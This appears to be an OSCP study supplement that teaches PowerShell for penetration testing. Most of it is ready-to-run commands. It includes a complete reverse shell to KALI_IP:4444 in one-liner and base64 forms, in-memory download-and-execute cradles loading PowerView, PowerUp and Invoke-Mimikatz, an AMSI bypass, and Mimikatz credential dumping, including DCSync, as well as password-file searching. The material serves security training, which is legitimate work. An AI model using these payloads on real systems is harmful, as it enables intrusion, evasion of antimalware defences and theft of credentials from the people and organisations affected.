# Supplementary: PowerShell for Penetration Testing

PowerShell is the primary interface on modern Windows systems. Every Windows machine from Windows 7 onward has it installed. On the OSCP, you'll use PowerShell for enumeration, exploitation, privilege escalation, and lateral movement. As a cybersecurity professional, you need to be comfortable reading and writing it.

---

## PowerShell Basics

### Running PowerShell

```cmd
:: From CMD — launch PowerShell
powershell

:: Run a single PowerShell command from CMD
powershell -c "Get-Process"

:: Run without profile loading (faster, fewer logs)
powershell -nop -c "command"

:: Run with execution policy bypass (for scripts)
powershell -ep bypass -c "command"
powershell -ep bypass -f script.ps1
```

### Execution policies

Windows restricts running PowerShell scripts by default. Bypass methods:

```powershell
# Check current policy
Get-ExecutionPolicy

# Bypass for this session
Set-ExecutionPolicy Bypass -Scope Process

# Or run scripts with bypass flag
powershell -ep bypass -f script.ps1

# Or pipe the content
Get-Content script.ps1 | Invoke-Expression
cat script.ps1 | powershell -nop -

# Or download and execute in memory (no file on disk)
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/script.ps1')
```

---

## Essential Commands for Pentesting

### System enumeration

```powershell
# System info
systeminfo
hostname
$env:COMPUTERNAME
$env:USERDOMAIN
$env:USERNAME

# OS version
[System.Environment]::OSVersion.Version
(Get-CimInstance Win32_OperatingSystem).Version

# Running processes
Get-Process
Get-Process | Select-Object Name, Id, Path | Format-Table -AutoSize

# Find processes with executable paths (useful for DLL hijacking)
Get-Process | Where-Object {$_.Path} | Select-Object Name, Path

# Running services
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-CimInstance Win32_Service | Select-Object Name, StartName, PathName | Format-Table -AutoSize

# Installed software
Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* |
    Select-Object DisplayName, DisplayVersion | Format-Table -AutoSize

# Environment variables
Get-ChildItem Env:
$env:PATH

# Network information
ipconfig /all
Get-NetIPAddress
Get-NetRoute
Get-NetTCPConnection | Where-Object {$_.State -eq "Listen"}
Get-NetTCPConnection | Where-Object {$_.State -eq "Established"}

# Firewall status
Get-NetFirewallProfile | Select-Object Name, Enabled

# Scheduled tasks
Get-ScheduledTask | Where-Object {$_.State -eq "Ready"} |
    Select-Object TaskName, TaskPath | Format-Table -AutoSize
Get-ScheduledTask | Get-ScheduledTaskInfo

# Local users and groups
Get-LocalUser
Get-LocalGroup
Get-LocalGroupMember -Group "Administrators"
```

### File operations

```powershell
# Search for files containing passwords
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config,*.xml -Recurse -ErrorAction SilentlyContinue |
    Select-String -Pattern "password|passwd|credential|secret" |
    Select-Object Path, LineNumber, Line

# Find recently modified files
Get-ChildItem -Path C:\Users -Recurse -ErrorAction SilentlyContinue |
    Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-7)} |
    Select-Object FullName, LastWriteTime | Format-Table -AutoSize

# Find specific file types
Get-ChildItem -Path C:\ -Include *.kdbx,*.key,*.pem,*.ppk -Recurse -ErrorAction SilentlyContinue

# Read a file
Get-Content C:\Users\admin\Desktop\notes.txt
type C:\path\to\file.txt

# Read PowerShell history
Get-Content (Get-PSReadLineOption).HistorySavePath

# Download a file
Invoke-WebRequest http://KALI_IP/file.exe -OutFile C:\temp\file.exe
(New-Object Net.WebClient).DownloadFile('http://KALI_IP/file.exe','C:\temp\file.exe')

# Base64 encode/decode
[Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\file.exe"))
[System.IO.File]::WriteAllBytes("C:\output.exe", [Convert]::FromBase64String("BASE64STRING"))
```

### Active Directory enumeration (from a domain-joined machine)

```powershell
# Current domain info
$env:USERDOMAIN
$env:LOGONSERVER
[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()

# Without RSAT (using .NET classes — always available)
$searcher = New-Object DirectoryServices.DirectorySearcher
$searcher.SearchRoot = New-Object DirectoryServices.DirectoryEntry

# List all users
$searcher.Filter = "(objectClass=user)"
$searcher.FindAll() | ForEach-Object { $_.Properties.samaccountname }

# List all groups
$searcher.Filter = "(objectClass=group)"
$searcher.FindAll() | ForEach-Object { $_.Properties.name }

# List all computers
$searcher.Filter = "(objectClass=computer)"
$searcher.FindAll() | ForEach-Object { $_.Properties.name }

# Find Domain Admins
$searcher.Filter = "(&(objectClass=group)(name=Domain Admins))"
$result = $searcher.FindOne()
$result.Properties.member

# With RSAT (if AD module is available)
Import-Module ActiveDirectory
Get-ADUser -Filter * | Select-Object SamAccountName, Enabled
Get-ADGroup -Filter * | Select-Object Name
Get-ADComputer -Filter * | Select-Object Name
Get-ADGroupMember "Domain Admins" | Select-Object SamAccountName
Get-ADUser -Filter * -Properties Description | Where-Object {$_.Description} | Select-Object SamAccountName, Description
```

---

## PowerShell for Exploitation

### Reverse shells

```powershell
# Basic PowerShell reverse shell (one-liner)
$c = New-Object Net.Sockets.TCPClient('KALI_IP',4444)
$s = $c.GetStream()
[byte[]]$b = 0..65535|%{0}
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object Text.ASCIIEncoding).GetString($b,0,$i)
    $r = (iex $d 2>&1 | Out-String)
    $r2 = $r + 'PS ' + (pwd).Path + '> '
    $sb = ([text.encoding]::ASCII).GetBytes($r2)
    $s.Write($sb,0,$sb.Length)
    $s.Flush()
}
$c.Close()

# As a one-liner (for injection)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('KALI_IP',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length))-ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()"

# Base64 encoded version (avoids special character issues)
# On Kali, encode the one-liner:
echo 'POWERSHELL_ONELINER' | iconv -t UTF-16LE | base64 -w 0
# Then run on target:
powershell -enc BASE64_STRING
```

### Download and execute in memory

```powershell
# Download a script and execute without writing to disk
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerUp.ps1')
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/Invoke-Mimikatz.ps1')

# Then call functions from the loaded script
Invoke-AllChecks                    # PowerUp
Get-DomainUser                      # PowerView
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

### AMSI bypass (when scripts get blocked)

Windows Antimalware Scan Interface (AMSI) scans PowerShell scripts before execution. When your scripts get blocked, try a bypass:

```powershell
# Simple AMSI bypass (may get caught by updated AV)
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# If that's blocked, try obfuscated versions
# Search GitHub for "AMSI bypass" for current methods
# The cat-and-mouse game between bypasses and AV updates is constant
```

---

## Key PowerShell Security Tools

### PowerView (AD enumeration)

```powershell
# Load it
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerView.ps1')

# Enumerate the domain
Get-Domain
Get-DomainController
Get-DomainUser | Select-Object samaccountname
Get-DomainGroup | Select-Object name
Get-DomainComputer | Select-Object name

# Find admin access
Find-LocalAdminAccess                    # machines you have admin on
Find-DomainUserLocation                  # where users are logged in
Get-DomainGPO | Select-Object displayname

# Find Kerberoastable users
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Find AS-REP roastable users
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname
```

### PowerUp (privilege escalation)

```powershell
# Load it
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/PowerUp.ps1')

# Run all checks
Invoke-AllChecks

# Checks for:
# - Unquoted service paths
# - Weak service permissions
# - Weak service binary permissions
# - AlwaysInstallElevated
# - Autologon credentials
# - Modifiable scheduled tasks
# - DLL hijacking opportunities
```

### Invoke-Mimikatz (credential dumping — PowerShell version)

```powershell
# Load it
IEX(New-Object Net.WebClient).DownloadString('http://KALI_IP/Invoke-Mimikatz.ps1')

# Dump credentials
Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
Invoke-Mimikatz -Command '"lsadump::sam"'
Invoke-Mimikatz -Command '"lsadump::dcsync /domain:corp.local /user:administrator"'
```

---

## PowerShell One-Liners Reference

```powershell
# Port scan
1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("TARGET",$_)) "Port $_ open"} 2>$null

# Check if a port is open
Test-NetConnection TARGET -Port 445

# Download file
iwr http://KALI/file.exe -o file.exe

# Encode command for -enc
$cmd = 'whoami'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))

# Find writable directories
Get-ChildItem C:\ -Directory -Recurse -ErrorAction SilentlyContinue |
    Where-Object { (Get-Acl $_.FullName).Access | Where-Object { $_.FileSystemRights -match "Write" -and $_.IdentityReference -match "Everyone|Users|Authenticated" } } |
    Select-Object FullName

# List all listening ports
Get-NetTCPConnection -State Listen | Select-Object LocalAddress, LocalPort, OwningProcess |
    ForEach-Object { $p = Get-Process -Id $_.OwningProcess -ErrorAction SilentlyContinue; $_ | Add-Member -NotePropertyName ProcessName -NotePropertyValue $p.ProcessName -PassThru } |
    Format-Table -AutoSize

# Find files modified in the last 24 hours
Get-ChildItem C:\Users -Recurse -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -gt (Get-Date).AddHours(-24) -and !$_.PSIsContainer } |
    Select-Object FullName, LastWriteTime
```

---

## CMD vs PowerShell Quick Reference

| Task | CMD | PowerShell |
|---|---|---|
| Who am I | `whoami` | `whoami` or `$env:USERNAME` |
| List files | `dir` | `Get-ChildItem` or `ls` |
| Read file | `type file.txt` | `Get-Content file.txt` or `cat file.txt` |
| Find text in files | `findstr /si "password" *.txt` | `Select-String -Pattern "password" -Path *.txt` |
| Download file | `certutil -urlcache -f URL file` | `iwr URL -o file` |
| Network info | `ipconfig /all` | `Get-NetIPAddress` |
| Running processes | `tasklist` | `Get-Process` |
| Services | `sc query` | `Get-Service` |
| Users | `net user` | `Get-LocalUser` |
| Groups | `net localgroup` | `Get-LocalGroup` |
| Environment vars | `set` | `Get-ChildItem Env:` |
| Registry query | `reg query HKLM\...` | `Get-ItemProperty HKLM:\...` |
